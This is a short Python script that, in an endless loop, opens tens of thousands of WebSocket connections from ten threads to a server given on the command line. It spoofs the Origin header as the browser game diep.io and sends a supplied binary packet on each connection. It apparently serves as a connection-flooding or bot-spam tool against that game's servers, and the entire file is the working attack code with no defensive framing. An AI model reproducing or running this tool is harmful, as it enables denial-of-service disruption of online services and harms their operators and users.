import sys
import json
import base64
import websocket
import concurrent.futures

url = None
packet = None
i = 1

def connect():
    global i
    j = i
    i = i + 1
    print(f"-> #{j}")
    ws = websocket.WebSocket()
    ws.connect(f"wss://{url}/", origin="https://diep.io", host=url)
    ws.send_binary(packet)
    print(f"<- #{j}")

if __name__ == "__main__":
    info = json.loads(base64.b64decode(sys.argv[1]))
    url = info["url"]
    packet = base64.b64decode(info["packet"])
    print(url)
    print(packet)
    while True:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(connect) for _ in range(10000)]
            concurrent.futures.wait(futures)
